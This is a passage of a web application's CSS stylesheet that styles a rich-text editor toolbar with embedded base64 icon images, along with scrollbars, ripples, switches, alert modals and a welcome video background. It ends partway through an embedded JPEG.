    .toolbar-container:not(.ios) .ql-format-button.ql-bold:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-bold .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=bold]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=bold]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAxlBMVEUAAAAAVaoAZswAVdUAbdsAXdEAatUAbcgAYM8AZswAasoAZswAaNAAasoAaMcAZMkAZswAZM0AZM0AZ8kAZM0AZcsAZMsAZMsAZ8oAZc0AZc0AZcsAZ8oAZswAZssAZssAZcwAZssAZ80AZs0AZ8wAZ80AZswAZ8wAZ8wAZ8wAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsyeO+aMAAAAQXRSTlMAAwUGBwsMDhAUGBkbHSAhIykuOUJERUpNUVZYXGRne3yAi4+SmqWmq67R1tfY2dve5ujp7/Dy8/T19vf4+fv8/mUg1b0AAACrSURBVDjL5dPFDgJBEEXRxt3d3d11gPv/P8WCEAgZuno/b1WLk1TqJaWUI1Jc8852Mqz5bdHHALDK2CF+ckgYIHp/0GtypxpHYKlFSqkycJeQD7hIKADMJFQHulrkSrYs2MflCnZZgzKvo7RJmZeSAWIf1V3nihSGAG19BUq1gKmEQsBZQkHAklATmOuQN5zvP4COQQWnmIxuFfERWOTsXmrztWg8qHqUU/IEzOhNFx6Ncl4AAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-italic:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-italic .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=italic]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=italic]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAjVBMVEUAAAAAAP8AgP8AgL8AVdUAYL8AatUAaNAAZswAZ8gAZ8gAZcoAZM0AZswAZcsAZMsAZMsAZcsAZ8sAZcoAZcoAZswAZs0AZ8wAZs0AZ8wAZswAZs0AZs0AZswAZ8wAZ8wAZs0AZswAZ8wAZ8wAZs0AZcwAZswAZswAZswAZswAZswAZswAZswAZswAZsyyI9XbAAAALnRSTlMAAQIEBggMGyMlKisuUFhZXmJmb3R9hIiKjZGTlKWprrG0uL3BxObt8PL19/j9SqrrawAAAIJJREFUOMvl0jUOQgEQRVHc3d1dzv6XRwch+WRq4NYnmVdMKvU35RZXz+7LQiJqe6uXiDrvqJuI8vM7ALd14fOwIabR+i1agUmfUA1QGedMgJrYRZPGGEVoh0ZgMmeUAlTBMbrWwiZCEwwitEc9MNkLigGq4RBda2MVoRn6X/jfv9YDjuYgGnCpSqcAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-underline:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-underline .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=underline]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=underline]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAWlBMVEUAAAAAAP8AZswAatUAaMsAZswAZM0AZ8oAZMsAZMsAZswAZswAZs0AZ80AZ8wAZ8wAZcwAZs0AZs0AZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZszogqY1AAAAHXRSTlMAAQUMLC04TU9UVYePkJKkxMXG2Nrf4+jz9/n6/qlZ0HQAAACUSURBVHja7Y3BDsIgEAW3UCmCFatQxLL//5uuiQ0py1EPxs5tHhMW/oMhxoF5TUSMzGuQqH2PfiO60yiLStIHi260qqKKNLDI0XouOpI6Fh1f/x9W6xOpYZHwNM/9u5lJvACGzvSQRiWlOiUkNDSwuMFCi87mkmTbQRvt18aXWwxhXFiW4IyAr3LBJtMmmtrRFT7ME0B0HEswIOSJAAAAAElFTkSuQmCC)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-strike:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-strike .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=strike]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=strike]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAABLFBMVEUAAAAAgP8AVaoAgL8AZswAVdUAYL8AccYAZswAbcgAZswAY8YAa8kAaNEAZMgAasoAaNAAZMgAasoAaMcAZMkAZswAZ8kAaMsAZM0AaMsAZswAZM0AZcoAZMsAZMsAZswAZc0AZ8oAZMsAZ8oAZcsAZMsAZcoAZMsAZswAZssAZssAZcoAZssAZcwAZssAZs0AZswAZ8wAZs0AZs0AZswAZswAZ8wAZs0AZs0AZ80AZ8wAZswAZ8wAZs0AZ8wAZ8wAZs0AZs0AZswAZ8wAZs0AZs0AZ8wAZcwAZs0AZ8wAZswAZcwAZs0AZs0AZ8wAZswAZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswL5dPDAAAAY3RSTlMAAgMEBQYICQoODxITFhcYGxwdICEtLzEzNjc4P0BFRkdISk1YWWBjaWtsdHZ3f4CHiImKjJGSk5SVl5ufo6Smp625uru8vb/BwsPExcbMzs/Q0dPi4+Tl6+zv8PL19vf4+/z2SQ4sAAABE0lEQVQ4y2NgGDmAV8c5PCkxxFGDE6cSDuOEZCiI0WXGroY/OBkJeHJhU8Pkm4wCXBixKFIHyUTqibJzS5lEgNhqWBT5AMWD+CFsHg8gxxuLoniguCyMIwLkxGFRBPKZDKEw8gMqCuAloEgb7HADMTZ8ijisjHTUlCSFOdgFxeVUNPXM7Z38QmJ9EApQxFFCyxeuxhtFPC7U39nBQl9LVV5CiAMpiFDEOYQlldR0jGwM8DmOVVDRLBpkpDIBr/KBXOBKKNSEgYpiMUQjgaLChBQ5A0W94AHO6wXkumEoUgY5NcpUUYCFRUDBNAqHw22T0YAdNp9bo6qxZMLqI4VAhJIgBZwelzZ0D4uLC3M3lB5B5QgAFQdgZ6NzzvYAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-link:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-link .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=link]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=link]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAABDlBMVEUAAAD///8AAP8AgP8AVaoAgL8AZswAVdUAYL8AZswAY8YAZswAYc4AaNEAZMgAZMgAZswAY80AZswAZ8gAZcoAaMsAZswAZswAZM0AZ8kAZcoAZswAZc0AZ8oAZc0AZ8oAZcsAZswAZ8oAZMsAZswAZc0AZcsAZ84AZswAZ84AZswAZswAZ8wAZs0AZs0AZs0AZ80AZswAZ8wAZswAZ8wAZswAZs0AZs0AZs0AZ8wAZswAZ8wAZ8wAZ8wAZs0AZswAZs0AZswAZswAZswAZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsxCnEEHAAAAWXRSTlMAAAECAwQFBggKEhQVFhccHiQoKissLTIzNDpGR0hMTU5QUlRVW12BgoaHjI2PmJmam5ygpKWosbKztLW6vcDD0NLT2Nna3N7g4eLj5Ofo6err7u/w8vn7/A90CXkAAAFqSURBVDjLzdTHUgJREIXho8yo6JgFc0LFjAkVMZAFJYrCzP/+L+JCtJipS5U7Patbt79Vd1dr6BfRHyBJUiie6dSSiwrEh2aeAPAO7cEoUqWXdHgQirQAOh7A46gZzVQBzsfmSgAnRhR6AjiS5OQAd9aE4t9GmqoCCRPKAGe9zzhQDxlQBzpjknab9c2RD2DBgGrgzUlqQnfrHlg3oGug6Eh1oFsAEtvLVhAteUBuSjseP2lfzQf6dARQjY/s9SncY9uH7DQA7+ky/XkI+8YSfvRVC6k3AO4s34BHT90+1N2yYq8A+/5V0Wyi0ac2NJkD3KgfSaGF9QRQ9oCC5JSAiyCStA2k9jzISooCFQNaBlpWrJBdkTThQsOA7DYQ+3pbKeDWgHQFvDiSNJwEWDWheRfIOZKVBLiRCekYoBiZSAHkx83IfgDABXielhkpfAcAkJ/WICTrwAXgZlyDkRS9rDRu1wJL98/u0yeVYHcP1mwWWgAAAABJRU5ErkJggg==)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-image:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-image .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=image]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=image]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAFVBMVEUAAAAAZ8oAZswAZswAZswAZswAZsx4QzxlAAAABnRSTlMATXjl6OmAFiJpAAAAZklEQVR42sXQsQ3AIAxEUeQZoKdyzwg0DALo9h8hiCYXo4R0/MbSK1ycO5EHlScVpj4Jj97p/vtJPi9U+kptXIlMIY2r1b4XIBpSoDJJFIyYtKohAWBIV8Ke9kv8X7WwtEmBKbkDXfWkWdehkaSCAAAAAElFTkSuQmCC)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-list:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-list .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=list]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=list]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAw1BMVEUAAAAAAP8AVdUAYL8AZswAYM8AYc4AaNEAZswAYs4AaNAAZswAaMcAZswAZ8gAZ8kAZcoAaMsAZswAZ8kAZ8oAZcoAZswAZswAZ8wAZs0AZs0AZswAZs0AZs0AZ8wAZs0AZ8wAZ8wAZs0AZ8wAZswAZswAZs0AZ8wAZswAZcwAZcwAZs0AZs0AZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZszno9YmAAAAQHRSTlMAAQYIDxAVFhkaGx4gKCo0NTY3OU10fYKIiYqMj56fo6SmqKmvtLe6vr/ExcbLz9fh4uXm5+jp7O/w8vP3+vv9Z7IwDAAAAK1JREFUOMvV0scOglAQQFGwYO+oiIq9YldEFPX+/1e5cGEii2FFdNY3b/JORlF+dAqNrS1GQyDEW+9Id/gaRw9EgQacMNEhuO4caD7rlgDS/2yAVWTiia53HWeEaMLzwUKIdvt08n4TxLMptc1UEo/38YqCuGZzKknimxDi6jpa8Vjn6I4kcQNgLkSmVSvjizeeb9ITbzxXxxLETatSxRfEWwAzicC4uANN+at5AdptTQ0Ubk4LAAAAAElFTkSuQmCC)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-bullet:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-bullet .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=bullet]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=bullet]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAElBMVEUAAAAAZ8oAZswAZswAZswAZsxixJGvAAAABXRSTlMATeXo6UtNtyIAAAAzSURBVCjPY2AYACBsyCAcCgOGYCHTYAZTuFAwRCgISSgILCSiyCACF1JkGBgw6voBcj0AFsUtDasGrUcAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-authorship:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-authorship .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=authorship]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=authorship]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAllBMVEUAAAAAgP8AasoAaNAAY84AaMcAZMkAZswAaMsAZswAZM0AZ8kAZMsAZ8oAZ8oAZcsAZc4AZ80AZcwAZcwAZcwAZswAZs0AZs0AZs0AZ80AZs0AZ8wAZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsyCDIYeAAAAMXRSTlMAAhgbHyAhLTEyMzlUV1xdXWZyd3yChImPkKy4yMrO0tPj5ebq7e7v8PLz9/j6/P3+PxHOPAAAAJxJREFUGBnVwNcOgjAYBeCj1j0q7oEbRHGe9385SSORJu1/jR/+QGcdn9ctiNSVmYuCZEljCcmOxh6ShEYCyYvGG5KURgpJSCOEZEpjDkmTRheCSu/OzHNSg1djw6/bCB7VA3/GcFux4FGHS5uWGVwWtIRw2dISwyWlDS5HWiK49CMWnPooP6UDD62Q04GXRk4HXgPk1DDwGCiU1AcZWy1RmD8CRQAAAABJRU5ErkJggg==)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-color:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-color .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=color]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=color]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAA0lBMVEUAAAAAAP8AgP8AVaoAgL8AVdUAccYAYsQAadIAY8YAaNEAaNAAY84AacsAZckAZ8gAZcoAZswAZM0AZcsAZswAZ8oAZswAZc0AZMsAZswAZ8oAZcsAZc4AZMsAZswAZcoAZ80AZcwAZswAZssAZssAZswAZs0AZs0AZs0AZ8wAZ8wAZ8wAZ8wAZswAZcwAZs0AZcwAZswAZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswVaivDAAAARXRSTlMAAQIDBAYJDRESFhsfIiYqNUFCREtNVVZZWlxdXWNkZWZtc3V2fYSOk5eksLO5xMXJ0tPV2Nnf4OXo6evs7fDz9Pf5/f6Y2SWXAAAAy0lEQVQYGdXA11LCQACF4YNijBq7sbCWKPaOLURREPjf/5WYyRAGJrvLLXyaB3GWxZoi+IFWIL9TgBN5VRoADXntktuWzyO5B3ls9Mj11uV2C7y8AjdyCtvAwRHwtyyXOpBWl5rAuRyqKVCXroDPBdntA+1QWv0H9mT3zJgnWW0xrr8pm3sm3MlircuEzorKroG3inKLX8ClyjLgTEMXwIfKMmgFGgo78K6y+LsZa+TwN93RzItM4mAiFUziZFQwiVNNheg4cahFmlEDFzs7cwmPHM8AAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-background:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-background .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=background]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=background]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAA5FBMVEUAAAAAAP8AgP8AVaoAgL8AZswAVdUAYL8AccYAYsQAadIAY8YAaNEAasoAZswAYsQAaNAAacsAZckAadEAZ8gAZcoAZswAZswAZMkAZM0AZcsAZ8sAZswAaM0AZ8oAZ80AZswAZc0AZMsAZswAZMsAZswAZcoAZcwAZswAZssAZssAZswAZs0AZs0AZs0AZ8wAZ8wAZ8wAZ8wAZswAZcwAZs0AZcwAZswAZswAZs0AZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZswAZsxJPDLdAAAAS3RSTlMAAQIDBAUGCAkNERIWGBkaGyImJyo1N0FCQkRFS0xNTVVWWVpjZGVtc3V2fYSOk5eksLO5xMXJ0tPV2Nnf4OXo6evs7fDz9Pf5/f60OfwzAAABG0lEQVR42s2T6VKDQBCEGyUJoqgSjcYg8dZ43/EieCUa5/3fx661qMAu7O98P4bZnq5lZlkwvXS7k1hf1BTdZFEsFpvUMU15IU7TuKiYJu9d5MODZZ8WcCBk39ZVAKcvpG+ZrgNsimIdTtV0TeBGFNewdBWORTFesUx3QcP9A8N59XT+kPWdPYavOQQVXfVYTtz6gI8jvfUsdRNWe8ApHy8z5ftgm8WhDyx8M4nKumoBd5LjVkkaAdYkz+8qpQLqtK+kwKU5XRPLP1JgNF8y3RkLjw4Us69cnMDb0qdLqR9myjEXz2brNPG2NSKQqOGPRJ5gEr8NYoT/9yHE7mfShoarovYptDw7kiWLyZTbNZBa9saK33tDWZlPK39U3ELkzhssBgAAAABJRU5ErkJggg==)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-left:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-left .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=left]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=left]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAElBMVEUAAAAAZ8oAZswAZswAZswAZsxixJGvAAAABXRSTlMATeXo6UtNtyIAAABCSURBVCjPY2AYACAcCgaGSEKmEKFgTKEgJCERiJAiw0ACqOuR/WCKLBSMKRSE7PqB9YMwuttRnBqMKRSEGvYD6HYAD8opyeJDvUUAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-right:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-right .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=right]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=right]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAElBMVEUAAAAAZ8oAZswAZswAZswAZsxixJGvAAAABXRSTlMATeXo6UtNtyIAAABCSURBVCjPY2AYMCAcCgaGSEKmEKFgTKEgJCERiJDiwLob2fWmyELBmEJByO4eWNejuN8QNZCRw94U3fUo7h8Q1wMAuRspyVIXC2UAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-center:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-center .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=center]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=center]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAElBMVEUAAAAAZ8oAZswAZswAZswAZsxixJGvAAAABXRSTlMATeXo6UtNtyIAAABCSURBVCjPY2AYGCAcCgaGSEKmEKFgTKEgJCERiJAiw4ABqNORPWCKLBSMKRSE7PQB9oAwuuNR3BqMKRSEGvID53gA5GspyQ9EElMAAAAASUVORK5CYII=)
    }

    .toolbar-container:not(.ios) .ql-format-button.ql-justify:hover,
    .toolbar-container:not(.ios) .ql-picker.ql-justify .ql-picker-label:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-label[data-value=justify]:hover,
    .toolbar-container:not(.ios) .ql-picker .ql-picker-item[data-value=justify]:hover {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkBAMAAAATLoWrAAAAElBMVEUAAAAAZ8oAZswAZswAZswAZsxixJGvAAAABXRSTlMATeXo6UtNtyIAAAAoSURBVCjPY2AYACAcigQMwUKmyELBmEJBYCERZCFFhoEBo64fINcDAAcQNGkJNhVcAAAAAElFTkSuQmCC)
    }
}
</style>
<style>
.toolbar-container .ql-format-group .ql-format-button:hover {
    background-color: #f9f9f9;
    background-image: none !important
}

.readmore-container .readmore-wrapper:after {
    display: block;
    position: absolute;
    height: 40px;
    left: 15px;
    right: 15px;
    z-index: 100;
    bottom: 0;
    content: " ";
    pointer-events: none;
    background-image: linear-gradient(rgba(255, 255, 255, 0), white)
}

.readmore-container .readmore-wrapper:after {
    left: 0;
    right: 0;
    transition: opacity 0.15s cubic-bezier(0.465, 0.183, 0.153, 0.946) 0.3s
}

.readmore-container.open .readmore-wrapper:after {
    opacity: 0
}

.virtual-scrollbar-track {
    position: absolute;
    right: 0;
    top: 0;
    width: 17px;
    height: 100%
}

.virtual-scrollbar-track .virtual-scrollbar {
    background-color: #696969;
    opacity: 0.5;
    width: 5px;
    border-radius: 5px;
    position: absolute;
    min-height: 10px;
    right: 2px;
    transition: opacity 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946), width 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.virtual-scrollbar-track:hover .virtual-scrollbar {
    opacity: 0.7;
    width: 10px
}

@keyframes rippleanim {
    from {
        transform: scale(0);
        opacity: 1
    }

    to {
        transform: scale(1);
        opacity: 0.5
    }
}

.ripple-wrapper .ripple:after {
    content: " ";
    display: block;
    position: absolute;
    left: -10px;
    top: -10px;
    width: 60px;
    height: 60px;
    animation: rippleanim 0.6s cubic-bezier(0.465, 0.183, 0.153, 0.946);
    transform-origin: 50% 50%;
    opacity: 0;
    border-style: solid;
    border-color: #FF6200;
    border-width: 10px;
    border-radius: 53.3333333333px
}

.language-switcher:after {
    content: "";
    display: table;
    clear: both
}

.banner.full_page button.close:hover {
    opacity: 0.8
}

.banner.full_page button.close:active {
    opacity: 0.6
}

.rn-carousel-control:hover {
    opacity: 1
}

.rn-carousel-control.rn-carousel-control-prev:before {
    content: "<"
}

.rn-carousel-control.rn-carousel-control-next:before {
    content: ">"
}

.help-system .hs-tablet .hs-slides:before,
.help-system .hs-desktop .hs-slides:before {
    content: "";
    display: block;
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 150px;
    background: white
}

.help-system .hs-tablet .hs-slides:after,
.help-system .hs-desktop .hs-slides:after {
    content: "";
    display: block;
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 150px;
    box-shadow: 0-2px 6px 0 rgba(0, 0, 0, 0.3);
    z-index: 5;
    pointer-events: none
}

.widget .panel-heading:after {
    content: "";
    display: table;
    clear: both
}

.widget .panel-body[ng-click]:hover h5 {
    color: #FF6200
}

.widget .panel-footer-link:hover {
    color: #FF6200
}

.transactions-listing .list-group-item .col-1:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    right: 0;
    top: 0;
    content: " ";
    pointer-events: none;
    background-image: linear-gradient(to right, rgba(255, 255, 255, 0), white)
}

.transactions-listing .list-group-item.activeitem .col-1:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    right: 0;
    top: 0;
    content: " ";
    pointer-events: none;
    background-image: linear-gradient(to right, rgba(168, 168, 168, 0), #A8A8A8)
}

.switch:has(+.toggle-switch-checkbox:focus) {
    border-color: #525199
}

.switch:has(>.toggle-switch-checkbox:checked) {
    background-image: linear-gradient(#349651, #349651)
}

.switch:has(>.toggle-switch-checkbox:checked)>.switch-button-thumb {
    translate: calc(100% - 4px)0
}

.switch:has(>.toggle-switch-checkbox:disabled) {
    background-image: linear-gradient(#A8A8A8, #A8A8A8);
    border-color: rgb(217, 217, 217)
}

#contentpane .scrollpane .container-fluid#address-update .related-persons li:before {
    content: "-";
    padding-right: 5px
}

#contentpane .scrollpane .container-fluid#address-update .required-document::after {
    content: " *";
    color: #d70000;
    position: relative;
    top: 3px;
    font-weight: normal;
    font-size: 20px;
    line-height: 15px
}

#contentpane .scrollpane #alerts .list-group .list-group-item.with-checkbox .pull-right:after {
    display: none
}

#form-alert-CPT .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-CPT01 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-CPT02 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-CPT0304 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-TIT01 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-CRE01 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-MSGSE .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-NOUDO .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after,
#form-alert-SEC02 .modal-body .scrollpane-content .top-details .pull-right .list-group-item-heading:after {
    display: block;
    position: absolute;
    height: 100%;
    width: 40px;
    left: -40px;
    top: 0;
    content: " ";
    pointer-events: none;
    box-shadow: -45px 0 30px -30px white inset;
    transition: box-shadow 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

@media (min-width:1025px) {
    #alerts .alerts-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

@media (min-width:480px) {
    #alerts .alerts-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (min-width:768px) {
    #alerts .alerts-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

.scrollpane .scrollpane-content #askProfilingConsent .advantage-list-item>*:before {
    content: "-"
}

#welcome .mying-discover-video:after {
    background: url(data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAAA8AAD/4QMdaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzA2NyA3OS4xNTc3NDcsIDIwMTUvMDMvMzAtMjM6NDA6NDIgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjc4QjMxMEQwMjU3NDExRTVBMjJFQTVEQUUzQjcxQzNGIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjc4QjMxMENGMjU3NDExRTVBMjJFQTVEQUUzQjcxQzNGIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0iNjcxMkQ5QzAwNDgzM0Y3NDBBREMyMjk2NTZFOEYxOEMiIHN0UmVmOmRvY3VtZW50SUQ9IjY3MTJEOUMwMDQ4MzNGNzQwQURDMjI5NjU2RThGMThDIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+/+4ADkFkb2JlAGTAAAAAAf/bAIQABgQEBAUEBgUFBgkGBQYJCwgGBggLDAoKCwoKDBAMDAwMDAwQDA4PEA8ODBMTFBQTExwbGxscHx8fHx8fHx8fHwEHBwcNDA0YEBAYGhURFRofHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8fHx8f/8AAEQgBkAGQAwERAAIRAQMRAf/EALYAAAEFAQEBAAAAAAAAAAAAAAQAAQIDBQYHCAEAAwEBAQEBAAAAAAAAAAAAAAECAwQFBgcQAAEDAgQEAwQFCQUGBQUAAAEAAgMRBCExEgVBURMGYSIHcYEyFJGhsUIjwVJicoKSsjMV0aLCU3PwQyQ0Fgjhs0R0NYOjVCYXEQEBAAIBBAADBQcDAgYDAQAAARECAyExEgRBUQVhgSITBnGRobHRMkLwweGCFPFSYnIjFZIzQ6L/2gAMAwEAAhEDEQA/APcnSJhRJKkA75KqacQbIQUGKin8U8psXdfDNGRhEXNCpyeBcFxXiqlTYNjkqqIQ1yolrXIC1rkjWApBKqBkkHkxKCRJQFbnKgokcgA534FBYYu4y0aVO1VrHNSvL3HksnRIi00TIQx2Saava7JMkwUEeqQKuCSoqlOCRxn3BWdaRmzOUrByVJ+xVCBXDgAVpEVlzSHWtIzqyF+ATONCB4SMYxxSqonrUri6JyRi43JlVlU0FTFUlYwKoyqTjgmkJMcUqvUDNiCorWMq7wqpbasuR1HFTWisy+KQQMtVUTa90kctHAElkSphjL5sUjISiqQWskCDwsMpAzSyMKjPQqLVyDLWepzVa1G0asEvFays6MjkTSua9M1rXphY16RJhyRpakBEuQEC5MK3uQA0r6JgBcS5pBh7i4uBUbVprGG+lSoaoh2KZL43YJwqvYU01YCgjkpAq4JKiqVSqAZ1NXGbK3FRhYSbAK4msq7kOK0iayZH+avitIzq6GRAlaEEnihQ5j8FNXEqqVwREUGMiOCE